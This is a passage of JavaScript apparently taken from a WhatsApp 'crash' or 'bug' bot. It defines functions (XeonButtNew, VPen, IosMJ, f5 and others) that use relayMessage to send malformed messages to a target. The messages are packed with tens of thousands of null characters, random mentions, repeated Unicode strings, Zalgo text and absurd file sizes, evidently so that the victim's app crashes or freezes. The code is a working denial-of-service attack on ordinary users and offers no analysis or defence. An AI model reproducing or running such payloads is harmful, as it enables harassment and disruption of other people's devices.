                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                        sections: [{
                          title: "",
                          rows: [{
                            title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
                    mentionedJid: zLoc,
                    mentions: zLoc
                  },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await bad.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                locationMessage: {
                  degreesLatitude: -21.980324912168495,
                  degreesLongitude: 24.549921490252018,
                  name: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ" + ggg,
                  address: "",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await bad.relayMessage(zLoc, {
            botInvokeMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {}
                },
                interactiveMessage: {
                  nativeFlowMessage: {
                    buttons: [{
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 Cela;\",\"key\":\"🦄드림 가이 Cela\",\"key_type\":\"RANDOM\"}}]}"
                    }]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await bad.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                liveLocationMessage: {
                  degreesLatitude: 11111111,
                  degreesLongitude: -111111,
                  caption: "xeontex",
                  url: "https://" + ggg + ".com",
                  sequenceNumber: "1678556734042001",
                  jpegThumbnail: null,
                  expiration: 7776000,
                  ephemeralSettingTimestamp: "1677306667",
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  },
                  contextInfo: {
                    mentionedJid: zLoc,
                    mentions: zLoc,
                    isForwarded: true,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "0@s.whatsapp.net"
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
        }
        
        async function XeonButtNew(zLoc, ptcp = false) {
   await bad.relayMessage(zLoc, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈\n" + "@916909137213".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈', url: \"https://youtube.com/dgxeon\", merchant_url: \"https://youtube.com/dgxeon\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    ptcp ? {
     participant: {
      jid: zLoc
     }
    } : {}
   );
  };
 async function VPen(zLoc, ptcp = false) {
    let valhalla = "Hola" + "𑲭𑲭".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let battanz = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Gateway To Hell"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: valhalla 
                        }]
                    }
                }
            }
        }
    };

    await bad.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}
    async function SendPairing(zLoc, Ptcp = false) {
			await bad.relayMessage(zLoc, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc
					}
				} : {}
			);
};

   async function IosMJ(zLoc, ptcp = false) {
      await bad.relayMessage(
        zLoc,
        {
          extendedTextMessage: {
            text: "CALL" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Scarlet - CALL" + "\u0000".repeat(50000),
                body: "͞.⃟  𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈⃤" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/Scarletsukanenen",
                mediaUrl: "https://t.me/Scarletsukanenen",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/Scarletsukanenen",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        ptcp
          ? {
              participant: {
                jid: zLoc,
              },
            }
          : {}
      );
    }

   async function f5(zLoc, ptcp = false) {
    await bad.relayMessage(zLoc, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "⭑̤▾ g͆Senkug̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ Crag̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺  ▾⭑̤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
              text: "ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ𓍯̤𖣂  Scarlet - U I\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A 